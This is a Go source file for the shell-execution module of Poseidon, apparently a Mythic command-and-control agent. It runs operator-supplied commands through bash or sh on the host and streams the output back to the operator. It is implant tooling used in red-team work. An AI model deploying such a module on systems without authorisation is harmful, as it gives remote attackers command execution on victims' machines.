package shell

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	shellBin := "/bin/bash"
	if _, err := os.Stat(shellBin); err != nil {
		if _, err = os.Stat("/bin/sh"); err != nil {
			msg.SetError("Could not find /bin/bash or /bin/sh")
			task.Job.SendResponses <- msg
			return
		} else {
			shellBin = "/bin/sh"
		}
	}
	command := exec.Command(shellBin)
	command.Stdin = strings.NewReader(task.Params)
	command.Env = os.Environ()

	stdout, err := command.StdoutPipe()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	stderr, err := command.StderrPipe()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	stdoutScanner := bufio.NewScanner(stdout)
	stderrScanner := bufio.NewScanner(stderr)
	outputChannel := make(chan string, 1)
	doneChannel := make(chan bool)
	doneTimeDelayChannel := make(chan bool)
	sendTimeDelayChannel := make(chan bool)
	go func() {
		bufferedOutput := ""
		doneCount := 0
		for {
			select {
			case <-doneChannel:
				doneCount += 1
				if doneCount == 2 {
					outputMsg := structs.Response{}
					outputMsg.TaskID = task.TaskID
					outputMsg.Completed = true
					if bufferedOutput != "" {
						outputMsg.UserOutput = bufferedOutput
					} else {
						msg.UserOutput = fmt.Sprintf("No Output From Command")
					}
					task.Job.SendResponses <- outputMsg
					doneTimeDelayChannel <- true
					return
				}
			case newBufferedOutput := <-outputChannel:
				bufferedOutput += newBufferedOutput
			case <-sendTimeDelayChannel:
				if bufferedOutput != "" {
					outputMsg := structs.Response{}
					outputMsg.TaskID = task.TaskID
					outputMsg.UserOutput = bufferedOutput
					task.Job.SendResponses <- outputMsg
					bufferedOutput = ""
				}
			}
		}
	}()
	go func() {
		for stdoutScanner.Scan() {
			outputChannel <- fmt.Sprintf("%s\n", stdoutScanner.Text())
		}
		doneChannel <- true
	}()
	go func() {
		for stderrScanner.Scan() {
			outputChannel <- fmt.Sprintf("%s\n", stderrScanner.Text())
		}
		doneChannel <- true
	}()
	go func() {
		for {
			select {
			case <-doneTimeDelayChannel:
				return
			case <-time.After(5 * time.Second):
				sendTimeDelayChannel <- true
			}
		}
	}()
	err = command.Start()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	err = command.Wait()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	return
}
